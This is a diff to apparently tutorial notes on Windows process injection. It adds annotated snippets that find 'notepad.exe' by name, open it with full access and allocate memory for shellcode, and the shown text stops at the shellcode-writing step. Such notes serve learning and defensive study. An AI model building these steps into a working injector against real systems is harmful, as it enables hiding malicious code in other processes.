@@ -42,9 +42,12 @@ Process32First() and Process32Next() are used to retrieve information about proc
 - Process32Next() retrieves information about the next process in the snapshot.
 - Both functions fill a PROCESSENTRY32 structure with details about the process, such as its ID, name, and other attributes.
   BOOL Process32First(
-  [in]      HANDLE           hSnapshot,
-  [in, out] LPPROCESSENTRY32 lppe
+  [in]      HANDLE           hSnapshot, //A handle to the snapshot returned from a previous call to the CreateToolhelp32Snapshot function.
+  [in, out] LPPROCESSENTRY32 lppe //A pointer to a PROCESSENTRY32 structure. It contains process information
+
 ); 
+exsample:
+Process32First(hSnapshot, &pe32);
 
 PROCESSENTRY32 STRUCTURE & SIZE
 -------------------------------
@@ -56,19 +59,36 @@ It returns the total number of bytes occupied by the type PROCESSENTRY32.
 
 This structure is defined as:
 typedef struct tagPROCESSENTRY32 {
-    DWORD dwSize;
-    DWORD cntUsage;
-    DWORD th32ProcessID;
-    ULONG_PTR th32DefaultHeapID;
-    DWORD th32ModuleID;
-    DWORD cntThreads;
+    DWORD dwSize; // Size of the structure, must be set before calling Process32First or Process32Next
+    DWORD cntUsage; // Count of times the process is used (not always relevant)
+    DWORD th32ProcessID; // Unique identifier for the process 
+    ULONG_PTR th32DefaultHeapID; // Default heap ID for the process
+    DWORD th32ModuleID; 
+    DWORD cntThreads; // Number of threads in the process
     DWORD th32ParentProcessID;
     LONG pcPriClassBase;
     DWORD dwFlags;
-    TCHAR szExeFile[MAX_PATH];
+    TCHAR szExeFile[MAX_PATH]; // Name of the executable file for the process
 } PROCESSENTRY32;
 
 So sizeof(PROCESSENTRY32) will compute the total size of all those fields.
+
+COMPARING PROCESS NAMES
+-----------------------------
+here we will be using wcscmp() to compare the process name with a target name.
+int wcscmp(
+   const wchar_t *string1,
+   const wchar_t *string2
+);
+- wcscmp() compares two wide-character strings.
+- It returns 0 if the strings are equal, a negative value if string1 is less than string2, and a positive value if string1 is greater than string2.
+- In our case, we use it to check if the process name matches "notepad.exe" (or any other target process name).
+- If the comparison returns 0, it means the process name matches, and we can proceed
+
+exsample:
+if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
+    // Process name matches, proceed with injection
+}
 
 OPENING A PROCESS
 -----------------
@@ -80,7 +100,18 @@ HANDLE OpenProcess(
 
 - If the function succeeds, the return value is an open handle to the specified process.
 - If the function fails, the return value is NULL.
-
+exsample:
+HANDLE hProcess = OpenProcess(
+    PROCESS_ALL_ACCESS, // Requesting all access rights
+    FALSE,              // Handle cannot be inherited
+    pe32.th32ProcessID  // Process ID of the target process
+);
+if (hProcess == NULL) {
+    error("Failed to open process: %lu", GetLastError());
+    return EXIT_FAILURE;
+} else {
+    okay("Successfully opened process with PID %lu", pe32.th32ProcessID);
+}
 
 MEMORY ALLOCATION IN REMOTE PROCESS
 -----------------------------------
@@ -94,7 +125,14 @@ LPVOID VirtualAllocEx(
 
 - If the function succeeds, the return value is a pointer to the allocated memory.
 - If the function fails, the return value is NULL.
-
+exsample:
+rAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+if (rAlloc_mem == NULL) {
+    error("Failed to allocate memory in target process: %lu", GetLastError());
+    return EXIT_FAILURE;
+} else {
+    okay("Successfully allocated memory in target process at address %p", rAlloc_mem);
+}
 
 WRITING SHELLCODE INTO PROCESS MEMORY
 -------------------------------------
